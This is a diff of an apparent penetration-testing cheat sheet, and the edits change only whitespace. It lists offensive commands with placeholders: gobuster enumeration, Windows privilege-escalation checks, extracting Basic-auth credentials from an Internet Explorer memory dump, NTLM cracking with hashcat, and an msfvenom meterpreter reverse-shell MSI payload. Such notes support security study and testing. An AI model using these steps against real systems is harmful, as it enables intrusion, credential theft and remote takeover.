@@ -1,8 +1,8 @@
 
 REMOTE ENUMERATION
--gobuster dir -u http://<ip>:80 -w <wordlist>  
+gobuster dir -u http://<ip>:80 -w <wordlist>  
  
- WINDOWS PRIVESC
+WINDOWS PRIVESC
 accesschk64.exe -wvu "<file location>"  
 Registry PrivEsc-AlwaysInstallElevated  
 reg query HKLM\Software\Policies\Microsoft\Windows\Installer  
@@ -27,7 +27,7 @@ GUI OR CMD > Copy iexplorer.DMP to Attacking Box
 TERM > strings <dumpfile>.DMP | grep "Authorization: Basic"
 TERM > echo -ne <Base64 String> | base64 -d
 
--hashcat -m 1000 <hash> <wordlist>
+hashcat -m 1000 <hash> <wordlist>
 
 MSFVENOM
 msfvenom -p windows/meterpreter/reverse_tcp lhost=<ip> lport=<port> -f msi -o <filename>.msi  
